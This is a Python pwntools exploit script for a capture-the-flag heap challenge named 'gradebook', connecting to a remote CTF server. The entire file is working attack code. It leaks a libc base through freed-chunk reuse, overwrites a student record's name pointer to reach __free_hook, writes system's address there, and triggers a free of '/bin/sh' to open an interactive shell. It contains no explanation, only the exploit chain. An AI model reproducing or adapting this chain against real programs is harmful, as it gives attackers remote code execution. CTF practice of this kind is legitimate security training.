from pwn import *

#r = process("./gradebook")
#gdb.attach(r)

r = remote("ctf.k3rn3l4rmy.com", 2250)

r.recvuntil(b">")


def add(id, size, name):
	r.sendline(b'1')
	r.recvuntil(b'Enter student id:')
	r.sendline(id)
	r.recvuntil(b'Enter student name length:')
	r.sendline(str(size).encode("utf-8"))
	r.recvuntil(b'Enter student name:')
	r.sendline(name)
	r.recvuntil(b'>')

def list_student():
	r.sendline(b'2')
	return r.recvuntil(b'>')

def update_grade(id, grade):
	r.sendline(b'3')
	r.recvuntil(b'Enter student id:')
	r.sendline(id)
	r.recvuntil(b'Enter grade:')
	r.sendline(str(grade).encode("utf-8"))
	r.recvuntil(b'>')

def update_name(id, name):
	r.sendline(b'4')
	r.recvuntil(b'Enter student id:')
	r.sendline(id)
	r.recvuntil(b'Enter student name:')
	r.sendline(name)
	r.recvuntil(b'>')

def clear():
	r.sendline(b'5')
	r.recvuntil(b'>')


malloc_hook_off = 0x00000000001ebb70


# leak libc address
add(b'1', 1280, "nnnn")
add(b'2', 0x40, "2222")
add(b'3', 0x40, "3333")
add(b'4', 0x40, "4444")
clear()
add(b'1', 1280, "111xxxx")

stuff = list_student().split(b'xxxx\n')[1][:6]
libc_base = int.from_bytes(stuff, "little") - (malloc_hook_off + 0x10 + 96)
print(hex(libc_base))

free_hook_addr = libc_base + 0x00000000001eeb28
system_addr = libc_base + 0x0000000000055410

clear()
add(b'1', 1280, b"/bin/sh\x00")
add(b'2', 0x40, "2222")
add(b'3', 0x40, "3333")

update_grade(b'3', 0x20000000000)


payload = b'/bin/sh\x00' + p64(0)*8 + p64(0x21) + p64(0x32) + p64(0x00000040ffffffff) + p64(free_hook_addr) 
update_name(b'3', payload)

payload = p64(system_addr) 
update_name(b'2', payload)

r.sendline(b'5')

r.interactive()